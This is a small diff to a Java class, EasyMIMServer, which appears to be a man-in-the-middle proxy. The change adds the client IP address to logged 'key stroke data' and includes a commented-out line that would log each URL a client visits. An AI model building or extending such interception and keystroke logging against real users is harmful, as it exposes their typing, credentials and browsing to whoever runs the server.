@@ -52,9 +52,12 @@ public class EasyMIMServer {
 	    		Gson gson = new Gson();
 	    		String s = gson.toJson(convertToRightMap(request.getParameterMap()));
 	    		LogElement l = (LogElement) gson.fromJson(s,LogElement.class);
-	    		System.out.println(new Date().toString()+":"+l.toString());
+	    		//log ket stroke data
+	    		System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+l.toString()+")");
 	    		return;
 	    	}
+	    	//log website visit
+	    	//System.out.println(new Date().toString()+":("+request.getRemoteAddr()+","+request.getRequestURL()+")");
 	    	wp = sessions.get(request.getRemoteAddr());
 			response.setStatus(HttpServletResponse.SC_OK);
 			wp.processRequest(request, response);
